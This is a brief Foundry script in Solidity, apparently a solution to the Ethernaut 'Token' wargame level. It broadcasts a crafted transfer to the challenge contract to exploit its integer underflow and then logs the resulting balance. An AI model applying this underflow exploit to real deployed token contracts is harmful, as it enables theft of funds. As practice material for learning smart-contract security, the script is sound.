// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {Token} from "src/5Token.sol";

contract TokenAttack is Script {
    address constant CHALLENGE = 0x91ea2Ff9917F15a26bC26478A2cA5C19bBc2ab26;
    Token public token;

    function run() public {
        vm.startBroadcast(); // Starts broadcasting transactions
        token = Token(CHALLENGE);
        token.transfer(0x91ea2Ff9917F15a26bC26478A2cA5C19bBc2ab26, 21);
        uint256 x = token.balanceOf(0x7b32DF263625bFCC9EdF743A382b81c2e1A567Ec);
        console.log(x);
        vm.stopBroadcast();
    }
}
